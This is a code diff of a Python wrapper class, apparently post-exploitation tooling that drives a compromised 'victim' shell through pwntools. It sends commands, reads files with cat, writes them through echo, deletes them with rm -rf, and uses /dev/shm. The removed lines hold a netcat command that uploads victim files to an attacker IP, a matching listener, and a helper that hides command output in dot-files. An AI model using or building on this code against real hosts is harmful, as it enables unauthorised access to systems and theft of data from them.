@@ -11,7 +11,7 @@ class PwnlibSocketWrapper:
         self.attacker_ip = attacker_ip
         self.timeout = 1
         self.encoding = 'utf-8'
-        self.remote_output_folder = '/tmp/'
+        self.remote_output_folder = '/dev/shm/' # /tmp/ TODO: Find somewhere I can write auto-magically
         self.netcat_file_transfer_port = 9002
         self.newline_bytes = b'\n'
 
@@ -38,45 +38,19 @@ class PwnlibSocketWrapper:
         ansi_escaped_output = utilities.escape_ansi(output)
         return ansi_escaped_output.strip()
 
-    def send_command_redirected_to_temporary_file(self, command_bytes: bytes) -> str:
-        _hash = hashlib.md5(command_bytes).hexdigest()
-        output_remote_temporary_file = f'{self.remote_output_folder}.{_hash}' # '.' prefix for hidden file
-
-        if self.remote_file_exists(output_remote_temporary_file):
-            return output_remote_temporary_file
-
-        command_str = command_bytes.decode(self.encoding)
-        redirected_command_bytes = f'{command_str} > {output_remote_temporary_file} 2>&1'.encode()
-        self.client.sendline(redirected_command_bytes)
-
-        return output_remote_temporary_file
-
     def read_remote_file(self, remote_path: str) -> str:
-        # Old implementation that I want to keep around for a while
-        """ thread = utilities.ThreadWithReturnValue(target=self.listen_for_netcat_file_upload_from_victim)
-        thread.start()
-
-        upload_command = f'nc -w 5 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
-        self.client.sendline(upload_command)
-
-        downloaded_output = thread.join() """
-
         cat_command = f'cat {remote_path}'.encode()
         file_contents = self.send_command_read_output(cat_command)
         return file_contents
     
     def write_remote_file(self, remote_path: str, content: str):
+        if self.remote_file_exists(remote_path):
+            print('File already exists, will overwrite...')
+            self.delete_remote_file(remote_path)
+
         for line in content.split('\n'):
             append_line_command = f'echo \'{line}\' >> {remote_path}'.encode()
             self.client.sendline(append_line_command)
-
-    def listen_for_netcat_file_upload_from_victim(self) -> bytes:
-        downloaded_output = None
-        pwn.context.log_level = 'error'
-        with pwn.listen(self.netcat_file_transfer_port).wait_for_connection() as client:
-            downloaded_output = client.recvall().strip()
-
-        return downloaded_output
 
     def delete_remote_file(self, remote_path: str):
         remove_command = f'rm -rf {remote_path}'.encode()
@@ -86,11 +60,6 @@ class PwnlibSocketWrapper:
         file_exists_command = f'file {remote_path}'.encode()
         output = self.send_command_read_output(file_exists_command, expect_single_line_output=True)
         return 'No such file or directory' not in output and ': empty' not in output
-
-    def send_command_read_output_through_temporary_file(self, command_bytes: bytes) -> str:
-        remote_temporary_file = self.send_command_redirected_to_temporary_file(command_bytes)
-        output = self.read_remote_file(remote_temporary_file)
-        return output
 
     def remote_file_readable(self, remote_path: str) -> bool:
         file_readable_command = f'find {remote_path} -readable'.encode()
